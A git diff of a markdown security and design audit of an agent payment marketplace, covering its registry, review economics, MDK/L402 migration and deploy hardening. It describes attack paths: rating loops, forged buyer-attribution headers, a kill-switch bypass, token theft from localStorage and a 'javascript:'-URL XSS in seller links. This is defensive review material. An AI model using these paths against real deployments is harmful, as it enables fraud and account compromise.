+| Registry | Honest tally, decay schedule, reviewer pick | Non-collusion with sellers | None (single SQLite, single operator) |
+| Reviewer | Submit honest scores | Hide subject from themselves (see C-2) | Honor + slashing (slashing path is C-4) |
+| Platform | Sum and *receive* fees | (counter only — no real receipt) | none — counter math only |
+| **MDK (NEW)** | (real mode, per ADR) Hosted node, channels, idempotency, credential redemption | (in code) — MDK never reached at runtime | None — `withPayment` import absent |
+| Activity-feed reader (NEW) | Read public ledger | Privacy of buyer/seller graph | None — public uncached endpoint |
+| Fly.io operator (NEW) | Host the SQLite volume; preserve `--ha=false` invariant; rotate `ADMIN_SECRET` | (cannot be enforced from app) | Operational discipline only |
 
 ---
 
 ## 5. Cold-start risk register
 
-Unchanged from prior audit; new entries for post-rebrand surfaces.
-
-| Feature                                | Liquidity required | N=0 / N=1 behaviour |
-|----------------------------------------|--------------------|---------------------|
-| Orchestrator `recommend`               | ≥1 service         | N=1 → `intent_match` dominates trivially. |
-| Search                                 | ≥1 service         | N=0 → empty list. |
-| Honor ranking                          | ≥1 honor signal    | All start at 0; `maxHonor=1` forced; honor weight is dead weight in v0. |
-| Peer review                            | ≥2 distinct pubkeys | "weighted random" meaningless at N=1; ADR's blindness claim doesn't hold below 2–3 reviewers. |
-| Buyer rating                           | ≥1 prior tx (30d)  | First-week sellers can't be rated; bootstrapping requires off-system trust. |
-| Subscriptions                          | ≥1 subscriber      | Watcher loops idle. |
-| Dataset marketplace                    | ≥1 dataset         | Single seller, no ranking signal between datasets. |
-| Slashing / dispute                     | Any reviewer       | Dispute path fires before liquidity does (anyone signed can dispute) — wrong cold-start signal. |
-| Platform-fee revenue                   | ≥1 settled tx      | Counter only; no payout pipe. |
-| **Public web index `aggregateStats`**  | ≥1 seller          | N=0 sellers → header reads `Sellers — / Services — / Transactions — / Sats moved —`. Acceptable. |
-| **Dashboard SPA `/sellers` proxy**     | Registry online    | Registry down → proxy returns 502; SPA shows error block. Acceptable. |
-| **Dashboard SPA balance**              | NWC reachable (real mode) or always-mock | Real-mode + NWC unreachable → balance object with `error` and `null` sats. |
-
-Concentrated-at-N≈1 risks: same as before (orchestrator collapses,
-single reviewer is the only option, first buyer can't rate first
-seller). The new public web surface makes these failure modes more
-visible, not worse.
+| Risk | Status |
+|---|---|
+| No reviewers on first registration → `requestReview` returns "no reviewers available" → seller can never accumulate honor through the peer-review path. | UNCHANGED |
+| First buyer cannot rate without a tx; first tx requires a buyer — chicken-and-egg eased only by the seller's own `transactions/record` (which S-2 lets them spoof). | UNCHANGED |
+| Activity feed shows `0` until the first paid call lands, then leaks the very first buyer/seller pair — privacy of the early adopters is poor. | NEW |
+| MDK real-mode boot requires three secrets (`MDK_ACCESS_TOKEN`, `MDK_MNEMONIC`, NWC). Any one missing → silent fall-back to in-house mint with the same wire format. The deploy contract makes no claim about this; an operator who *thinks* they are on MDK may be on the in-house shim. | NEW |
+| Fly registry first-deploy: `ADMIN_SECRET` is `--stage`d and must be deployed; missing it returns 503 on every admin endpoint. Fail-secure but loud. | NEW (bounded — admin endpoints fail closed) |
 
 ---
 
 ## 6. Moat-test results per seller type
 
-The "make-vs-buy-vs-spawn" framework is still not documented in the
-codebase; I evaluate against the inferred standard.
+(Question: can a competitor stand up a parallel service and undercut
+or outpace this one without a meaningful re-build cost?)
 
-| Seller            | Sells                                              | Make-it-yourself cost            | Buy-from-existing-API alternative    | Moat as built |
-|-------------------|----------------------------------------------------|----------------------------------|--------------------------------------|---------------|
-| `vision-oracle-3` | OSM-geocoded listing verify + signed receipt       | OSM Nominatim is free            | Direct Nominatim                     | **WEAK.** Moat is the L402 demo + signed proof, not the data. |
-| `market-monitor`  | GHSA advisories + filter + debounced delivery       | GitHub publishes advisories.json | Direct GitHub + cron                 | **VERY WEAK.** No auth, no ETag caching; "we already wrote the cron" is the only value. |
-| `dataset-seller`  | NOAA PNW 2015–25                                   | NOAA opendata + S3 cli           | Wget                                 | **PROMISED-NOT-DELIVERED.** Provenance + signed contents are ADR claims; code serves a 20 KB JSON fixture in both modes. |
-| Reviewer          | Independent rubric + slashing-backed honesty       | Hire any LLM judge               | None off-the-shelf                   | **CONDITIONAL.** Slashing teeth are fictitious money on a default-secret HMAC log; moat depends on a settlement layer that doesn't exist. |
-| **Web index (`web/`)** | Read-only browse over the registry             | The registry's own JSON endpoints | A tab with `curl` + `jq`             | **N/A — not a paid seller.** Moat is UX (a pretty page over public data); it doesn't gate any payment. |
-| **Dashboard SPA** | Local-only kill-switch UI + tx log                 | Curl the control plane           | Doesn't apply (per-host human tool)  | **N/A — local utility.** Moat is convenience, not economics. |
-
-Drift summary unchanged: provider holds (because the demo intent IS
-the protocol), market-monitor erodes, dataset is promised-not-built,
-reviewer depends on a missing settlement layer.
+| Seller type | Moat depth | Notes |
+|---|---|---|
+| Provider (`vision-oracle-3`) | Shallow | OSM-geocoded listing-verify is ~50 lines around Nominatim; no proprietary data. |
+| Market-monitor | Shallow | GHSA poller; public feed. |
+| Dataset-seller | Vapor | The "dataset" is a JSON fixture; ADR 0008's file-on-disk path is unimplemented (C-3). |
+| Registry as a coordinator | Shallow but sticky | Sticky because seller pubkeys self-register and accumulate honor — *but* honor is gameable per S-1+S-2, so the stickiness is illusory. A competing registry could index the same pubkeys and re-derive everything except the colluder-padded honor scores, which is a feature, not a bug. |
+| Activity feed (NEW) | Negative moat | The feed is *self-undermining*: a competing registry can scrape `/transactions/recent` from this one and import the entire counterparty graph. No rate limit, no auth, full pubkey visibility. |
 
 ---
 
-## 7. Status of previous audit's top 5 concerns
+## 7. Status of previous audit's top-5 concerns
 
-| # | Concern                                                                          | Status   | Notes |
-|---|----------------------------------------------------------------------------------|----------|-------|
-| 1 | CRITICAL — honor unbounded and trivially gamed (no per-(buyer,seller) UNIQUE)    | **STILL** | `rateSeller` is byte-for-byte unchanged. ADR 0010 is not amended. |
-| 2 | CRITICAL — review economics decorative (no Lightning escrow / payouts / slashing)| **STILL** | Build-summary §6.4 still admits this. No `reviewer_owed` table; HMAC default secret still committed. |
-| 3 | HIGH — buyer attribution on tx records unauthenticated                            | **SHIFTED (worse)** | Header chain widened to `x-agora-* ?? x-andromeda-* ?? x-lumen-*` post-ADR 0013. Three names now spoofable; ADR 0013 doesn't analyze the trade-off. |
-| 4 | HIGH — "blind" reviewer assignment isn't blind, "random" isn't verifiable        | **STILL** | `pickRandomReviewer` + `getReviewerAssignments` unchanged. |
-| 5 | HIGH — 2% platform fee is a counter, not a payout                                | **STILL** | `platform_fee_sats` still seller-supplied; no `PLATFORM_NWC_URL` payout wired. |
+| # | Concern | Status |
+|---|---|---|
+| 1 | `rateSeller` no per-(buyer,seller) uniqueness — trivially gamed | **STILL** — code unchanged at `registry/src/lib/reviews.ts:49–69`. No UNIQUE index added; no last-write-wins; no rate-limit. |
+| 2 | Review economics decorative (escrow/payouts are counters) | **STILL** — `slashReviewer` line 162 comments "(mock: just record. real: trigger NWC payback.)"; no NWC leg exists. |
+| 3 | Buyer attribution on tx records unauthenticated | **STILL** — `transactions/record` route line 30 verifies seller only; `buyer_pubkey` is free-form. |
+| 4 | "Blind" reviewer assignment isn't blind, "random" isn't verifiable | **STILL** — `getReviewerAssignments` returns `subject_pubkey`; `pickRandomReviewer` uses `Math.random()`. |
+| 5 | 2% platform fee is a counter, not a payout | **STILL** — `/v1/platform/revenue` reads the sum from SQLite; nowhere in code does a payment leave the platform's NWC. |
 
-Net: **0 of 5 addressed**, **1 shifted (worse)**, **4 unchanged**.
+Plus from prior security audit:
 
----
+**P1 default `dev-admin-secret`** — **CLEAN FIX in `d64ebcf`.** The
+fallback string is removed from all three call sites
+(`/v1/admin/decay`, `/v1/admin/fast-forward`, `/v1/platform/revenue`).
+The new `requireAdmin()` helper at `registry/src/lib/admin.ts:9–22`
+fails secure with 503 if `ADMIN_SECRET` is unset or shorter than 16
+chars. There is no remaining default and no remaining call site that
+bypasses the helper. Verified by `grep`: zero hits for
+`dev-admin-secret` in the registry source. This is unambiguously a
+**complete fix**, not a relocation.
 
-## 8. Top 5 design concerns (post-rebrand, ranked by severity)
-
-### S1 — CRITICAL · Honor system is unbounded and trivially gamed
-
-Unchanged from previous audit; still rank-1. `POST /sellers/:pubkey/rate`
-has no per-(buyer, seller) UNIQUE constraint. One 240-sat purchase
-buys an attacker an unbounded honor-rating loop. Honor feeds (a) the
-orchestrator's 20% ranking weight and (b) reviewer pick-weighting in
-`pickRandomReviewer`. Game one rating loop, win the review queue.
-
-### S2 — CRITICAL · Review economics are decorative
-
-Unchanged. Escrow is a number on a row; `reviewer_payout_sats` is a
-JSON field with no ledger backing; slashing audit log uses a
-default-fallback HMAC string that is committed to the source. The
-PayMyAgent narrative invokes "trust + slashing" as a feature; the
-implementation is bookkeeping with no money behind it.
-
-### S3 — HIGH · ADR 0013 widened the buyer-attribution header surface, not narrowed it
-
-The post-rebrand naked-attribution chain on every paid endpoint
-accepts `x-agora-pubkey ?? x-andromeda-pubkey ?? x-lumen-pubkey`. None
-of these are authenticated. An attacker can attribute *any* purchase
-to *any* victim pubkey by sending the right header. The previous
-audit rated this HIGH at one header; ADR 0013 made it three. Combined
-with S1, this means: a single attacker can rate up any seller using
-any victim pubkey as the "buyer," skipping even the 30-day tx-history
-gate (because they can fabricate the tx attribution themselves on a
-single 240-sat purchase). ADR 0013 doesn't discuss the trade-off; the
-phase-1b test passes the wrong way (C-6).
-
-### S4 — HIGH · Registry's signed-write gate silently rejects two of the three header families it claims to accept
-
-ADR 0013 §"Signed-request HTTP headers" says the verifier accepts all
-three header families on incoming. `registry/src/lib/sig.ts:16` does
-a manual pre-check using only the `x-agora-*` constants, returning
-`401 missing signature headers` before delegating to
-`verifyRequest()` (which itself does the right thing). Outcome: any
-buyer that signed with `x-andromeda-*` or `x-lumen-*` headers is
-rejected, contradicting the rebrand's explicit backwards-compat
-promise. The test asserts 401 on tampered headers but does not
-distinguish reasons, so the regression-shaped pass.
-
-### S5 — HIGH · Dashboard kill-switch isn't enforced on control-plane proxy endpoints, and the bearer token is in `localStorage`
-
-Two distinct issues that compound:
-
-(a) ADR 0011 §3 promises the kill-switch will refuse to proxy
-registry calls; the implementation only checks kill-switch inside
-`budget.js::reserve()`. The five proxy endpoints (`/balance`,
-`/transactions`, `/subscriptions`, `/subscriptions/:id/cancel`,
-`/sellers`) bypass it. `POST /subscriptions/:id/cancel` is a
-*write* not gated by either kill-switch or budget; the dashboard UI
-copy ("every paid MCP tool refuses with `kill_switch_active`") is
-misleading.
-
-(b) The dashboard SPA stores the control-plane bearer token in
-`localStorage` (`controlPlane.ts:9-46`). Any same-origin XSS — or any
-malicious browser extension on `localhost:5173` — leaks a token with
-unconditional control-plane authority. ADR 0011 chose `localStorage`
-implicitly (no discussion of token storage security in §4 "state
-store"). Combined with (a), a leaked token enables silent
-subscription cancellation that the user's "halt" cannot stop.
-
-### Honourable mention · `<a href={seller.url}>` is a `javascript:`-URL XSS vector in the public web index
-
-Not in the top 5 because it requires (i) a malicious seller, (ii) a
-human visitor clicking, and (iii) ignoring rel=noopener (which is
-present). But: the registry doesn't validate the URL scheme on
-registration, the web app doesn't validate it on render. A seller
-who registers `url: "javascript:..."` will execute script in any
-clicker's browser at the `localhost:3300` (or production) origin.
-ADR 0012's trust-boundary discussion doesn't mention scheme
-validation; this is the *direct* gap the audit prompt asked about.
-HIGH if any production deployment exists; MEDIUM in the demo as
-shipped.
+(Note: the dispute route still calls `slashReviewer` directly without
+admin auth — that is a separate, pre-existing issue; C-4. The admin
+fix did not extend to disputes.)
 
 ---
 
-## Appendix · Files inspected (post-rebrand)
+## 8. MDK migration design verdict
 
-In addition to the previous audit's set:
+**Verdict: stopgap that creates technical debt.**
 
-- `dashboard/src/App.tsx`, `dashboard/src/lib/store.ts`,
-  `dashboard/src/lib/controlPlane.ts`, `dashboard/src/components/Allowance.tsx`,
-  `dashboard/src/components/Setup.tsx`
-- `mcp/control-plane.js`, `mcp/budget.js`
-- `web/src/app/layout.tsx`, `web/src/app/page.tsx`,
-  `web/src/app/sellers/page.tsx`, `web/src/app/sellers/[pubkey]/page.tsx`,
-  `web/src/app/services/[id]/page.tsx`, `web/src/app/search/page.tsx`,
-  `web/src/lib/registry.ts`, `web/src/components/pubkey.tsx`
-- `packages/agora-core/src/signed-request.ts`
-- `registry/src/lib/sig.ts`, `registry/src/lib/db.ts`,
-  `registry/src/lib/reviews.ts`,
-  `registry/src/app/api/v1/sellers/register/route.ts`,
-  `registry/src/app/api/v1/transactions/record/route.ts`,
-  `registry/src/app/api/v1/sellers/[pubkey]/rate/route.ts`,
-  `registry/src/app/api/v1/reviews/[id]/dispute/route.ts`
-- `provider/src/app/api/v1/listing-verify/route.ts`,
-  `agents/dataset-seller/src/server.js`
-- `docs/decisions/0001..0013-*.md`, `docs/BUILD-SUMMARY.md`,
-  README.md, PAYMYAGENT.md
+Rationale:
 
-No code modified. No tests run.
+1. The wire format moves to MDK shape, but no MDK code is on any
+   execution path (C-9). `withPayment`, `@moneydevkit/*` imports,
+   `MDK_ACCESS_TOKEN` reads — all absent. The "real mode" the ADR
+   describes is not the real mode the code implements.
+
+2. The "offline shim" is now the *only* mode the codebase ships,
+   under both `MOCK_MODE=true` and `MOCK_MODE=false`. It re-derives
+   MDK's HMAC scheme from a vendored constant (`mdk402-token-v1`)
+   without a fixture proving byte-equivalence with a real MDK token
+   (C-10). If MDK rotates that constant or changes the field
+   ordering — both currently un-versioned private exports — Agora
+   silently desynchronises.
+
+3. The soft-transition verifier introduces a second authenticator
+   path with the same secret (C-12). Single-secret, two-format,
+   independent verifier code — the union of acceptable inputs grows;
+   the test gates only assert positive recognition of each path, not
+   non-equivalence.
+
+4. The "Migration timeline" is undefined (C-11): "one major-version
+   bump" in a workspace with no version. The deprecation is
+   open-ended.
+
+5. The actual integration value the SPIRAL brief asks for —
+   MDK-issued bolt-11 invoices, MDK-managed channels, MDK-side
+   credential redemption — is documented in ADR 0014 §"Migration
+   timeline" as the *next* step. The current step is wire-format
+   only.
+
+The hybrid is sound *as a step*. It is not sound as the destination
+the README and ADR 0014 §"Decision" both claim. The honest reading is
+that ADR 0014 deferred MDK adoption while preserving the option, and
+the docs over-state how far down the path the code actually walks.
+
+---
+
+## 9. Deploy commit design review (`d64ebcf`)
+
+**Verdict: admin hardening is complete; deploy contract is sound but
+not ADR-bound.**
+
+Strong points:
+
+- `requireAdmin()` fails closed (503) on absent or short
+  `ADMIN_SECRET`. No dev fallback.
+- All three previously-affected routes converted to call the helper.
+- `AGORA_REGISTRY_URL` is fail-loud at runtime in production for the
+  web app, with a `NEXT_PHASE` escape so the build phase doesn't
+  break.
+- `--ha=false` invariant documented; the SQLite-corruption risk for
+  multi-machine is called out.
+- Pre-existing TS error (`reviews/dispute/route.ts` duplicate `ok`
+  key) fixed in passing.
+- Operational secrets (`ADMIN_SECRET`, `AGORA_REGISTRY_SECRET`)
+  rotated via `fly secrets set`, no in-tree default values.
+
+Soft points:
+
+- The single-instance contract is operational (a runbook step), not
+  enforced in code. A second `fly machine clone` will silently
+  corrupt SQLite. ADR 0004 predicted SQLite-as-truth but didn't bind
+  the deploy topology to it.
+- Volume backups depend on Fly's daily snapshots + an ad-hoc SSH
+  workflow; no application-level backup endpoint.
+- `AGORA_REGISTRY_SECRET` (used for cross-service signed requests)
+  is generated and set at deploy time but its rotation story isn't
+  written down — services that hold the key in `.env.local` would
+  desync silently.
+- Web index has `revalidate = 0` only on `/activity`; the other six
+  pages still cache without an invalidation hook on registry writes
+  (an existing C-8 issue, not introduced here, but unaddressed).
+- The dispute path remains un-admin-gated and un-buyer-gated; the
+  hardening pass did not extend to it (C-4).
+
+**Net.** The admin secret fix is clean. The deploy story is a
+sensible single-instance posture. Neither is in an ADR; the deploy
+contract should be (U-4).
+
+---
+
+## 10. Triple-aliasing and ADR 0014
+
+ADR 0013 widened the attack surface: 3 MCP-tool name families,
+3 env-var families, 3 HTTP-header families. ADR 0014 does not
+narrow any of them; it adds a *fourth* shape (legacy macaroon
+soft-transition) on top.
+
+Surfaces in scope after ADR 0014:
+
+| Surface | Active shapes | Trend |
+|---|---|---|
+| MCP tool names | 3 (`agora_*`, `andromeda_*`, `lumen_*`) | Unchanged |
+| Env vars | 3 (`AGORA_*` → `ANDROMEDA_*` → `LUMEN_*`) | Unchanged |
+| HTTP signed headers | 3 (`X-Agora-*`, `X-Andromeda-*`, `X-Lumen-*`) — but registry's gate accepts only canonical (C-6) | Unchanged; still mis-implemented |
+| L402 macaroon format | 2 (MDK-shape, legacy `base64url(json).hmac`) | **Widened by ADR 0014** |
+| Auth scheme | 2 (`L402`, `LSAT`) — was already there per bLIP-26 | Unchanged |
+
+ADR 0014 makes the surface wider, not narrower. The deprecation
+timelines for both ADR 0013 and ADR 0014 are open-ended (C-11), so
+the surface is permanent until someone writes a "go-narrow" ADR.
+
+---
+
+## 11. New top 5 design concerns (ranked)
+
+1. **CRITICAL — S-1 + S-2 still ship.** Honor is `±5N` for any
+   colluder with one HTTP key generation step. Not addressed since the
+   prior audit. Activity-feed makes the colluder's footprint visible
+   to anyone who scrapes the feed, but does not prevent the attack.
+
+2. **CRITICAL — ADR 0014 documents an MDK integration that does not
+   exist in code (C-9).** The README, BUILD-SUMMARY, and ADR all
+   describe a real-mode MDK path that the provider does not implement.
+   This is the most impactful coherence gap in the repo right now,
+   because it is the *centerpiece of the SPIRAL brief response*. The
+   wire format is MDK-compatible; the system is not MDK-integrated.
+
+3. **HIGH — Soft-transition L402 verifier widens attacker surface
+   (C-12).** Two distinct authenticator constructions sharing one
+   secret, no negative test for cross-construction confusion. The
+   timeline to retire the legacy verifier is rhetorical (C-11).
+
+4. **HIGH — Activity feed is a public counterparty graph (S-6, U-3,
+   trace C).** Adds a privacy regression (full buyer pubkey + payment
+   hash exposed), no rate limit, no ADR, no caching past 2 s. Easy to
+   scrape. Hard to walk back once buyers depend on it.
+
+5. **MEDIUM — Triple-aliasing + soft-transition macaroon together
+   constitute a permanent compatibility burden (C-11, §10).** Two
+   stacked open-ended deprecations on a non-versioned package. Every
+   future signed-call or paid-call surface must respect *all* legacy
+   shapes; deprecation is unconditioned on any concrete event.
+
+(Concerns #3, #4, #5 from the prior audit list — escrow-as-counter,
+unauth buyer attribution, blind-not-blind reviewer assignment — also
+remain open. They are no longer in the top 5 only because two new
+issues from ADR 0014 leapfrog them in *novelty*, not in severity.)
+
+---
+
+## 12. Summary
+
+ADR 0014 (MDK migration) is, at the code level, a wire-format
+rewrite of the in-house L402 layer using vendored MDK constants — not
+an integration with MDK. Its README/ADR rhetoric over-states how much
+MDK is on the runtime path. The hybrid story creates a permanent
+soft-transition verifier and widens the auth surface; the deprecation
+timeline that would retire either is undefined.
+
+The activity feed PR (`5aacd66`) is functional and shippable but
+public, uncached, and undescribed by any ADR. It exposes the
+counterparty graph and per-tx payment hashes — a privacy regression
+relative to the previous aggregate-only stats.
+
+The deploy commit (`d64ebcf`) is the highlight: a clean, fail-secure
+fix to the previous P1 default-admin-secret, a sensible single-instance
+SQLite contract, and a fail-loud production posture for the web app.
+The deploy contract should be promoted to an ADR.
+
+The previous audit's top-5 design concerns are all unaddressed in
+code. The post-MDK additions add new top-tier concerns above them.
